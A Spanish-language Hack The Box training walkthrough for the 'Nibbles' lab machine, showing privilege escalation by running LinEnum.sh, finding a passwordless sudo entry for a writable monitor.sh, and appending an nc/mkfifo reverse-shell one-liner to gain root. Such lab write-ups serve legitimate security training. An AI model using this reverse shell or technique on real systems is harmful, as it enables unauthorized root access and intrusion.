Ahora que tenemos una conexión shell inversa, es hora de aumentar los privilegios. Podemos descomprimir el archivo `personal.zip` y ver un archivo llamado `monitor.sh`.

~~~
nibbler@Nibbles:/home/nibbler$ unzip personal.zip

unzip personal.zip
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh 
~~~

El shell script `monitor.sh` es un script de monitoreo, y es propiedad de nuestro usuario `nibbler` y se puede escribir.

~~~
nibbler@Nibbles:/home/nibbler/personal/stuff$ cat monitor.sh

cat monitor.sh
                 ####################################################################################################

                 #                                        Tecmint_monitor.sh                                        #

                 # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #

                 # If any bug, report us in the link below                                                          #

                 # Free to use/edit/distribute the code below by                                                    #

                 # giving proper credit to Tecmint.com and Author                                                   #

                 #                                                                                                  #

                 ####################################################################################################

#! /bin/bash

# unset any variable which system may be using

# clear the screen

clear

unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage

while getopts iv name
do
       case $name in
         i)iopt=1;;
         v)vopt=1;;
         *)echo "Invalid arg";;
       esac
done

 <SNIP>
 ~~~

 Dejemos esto a un lado por ahora y extraigamos [LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh) para realizar algunas comprobaciones automáticas de escalada de privilegios. Primero, descargue el script a su VM de ataque local o Pwnbox y luego inicie un servidor HTTP de `Python` usando el comando `sudo python3 -m http.server 8080`.

 ~~~
 Juceco@htb[/htb]$ sudo python3 -m http.server 8080
[sudo] password for ben: ***********

Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.129.42.190 - - [17/Dec/2020 02:16:51] "GET /LinEnum.sh HTTP/1.1" 200 -
~~~

De vuelta en el tipo de destino `wget http://<your ip>:8080/LinEnum.sh` para descargar el script. Si tiene éxito, veremos una respuesta de `200 success` en nuestro servidor HTTP de Python. Una vez que se extrae la secuencia de comandos, escriba `chmod +x LinEnum.sh` para hacer que la secuencia de comandos sea ejecutable y luego escriba `./LinEnum.sh` para ejecutarlo. Vemos un montón de resultados interesantes, pero lo que inmediatamente llama la atención son los privilegios de `sudo`.

~~~
[+] We can sudo without supplying a password!
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh


[+] Possible sudo pwnage!
/home/nibbler/personal/stuff/monitor.sh
~~~

El usuario de `nibbler` puede ejecutar el archivo `/home/nibbler/personal/stuff/monitor.sh` con privilegios de root. Dado que tenemos control total sobre ese archivo, si agregamos un reverse shell de una sola línea al final y ejecutamos con `sudo`, deberíamos obtener un shell inverso como usuario raíz. Editemos el archivo `monitor.sh` para agregar una sola línea de reverse shell.

~~~
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 8443 >/tmp/f' | tee -a monitor.sh
~~~

Si buscamos el archivo `monitor.sh`, veremos el contenido anexado al final. `Es crucial si alguna vez nos encontramos con una situación en la que podamos aprovechar un archivo editable para escalar privilegios. Solo agregamos al final del archivo (después de hacer una copia de seguridad del archivo) para evitar sobrescribirlo y causar una interrupción`. Ejecute el script con `sudo`:

~~~
 nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh 
~~~

Finalmente, captura el root shell en nuestro oyente `nc` en espera.

~~~
Juceco@htb[/htb]$ nc -lvnp 8443

listening on [any] 8443 ...
connect to [10.10.14.2] from (UNKNOWN) [10.129.42.190] 47488
# id

uid=0(root) gid=0(root) groups=0(root)
~~~

Desde aquí, podemos agarrar el indicador `root.txt`. Finalmente, ahora hemos resuelto nuestra primera maquina sobre HTB. Trate de replicar todos los pasos por su cuenta. Pruebe varias herramientas para lograr el mismo efecto. Podemos utilizar muchas herramientas diferentes para los distintos pasos necesarios para resolver esta maquina. Este tutorial muestra un método posible. Asegúrate de tomar notas detalladas para practicar ese conjunto de habilidades vitales.




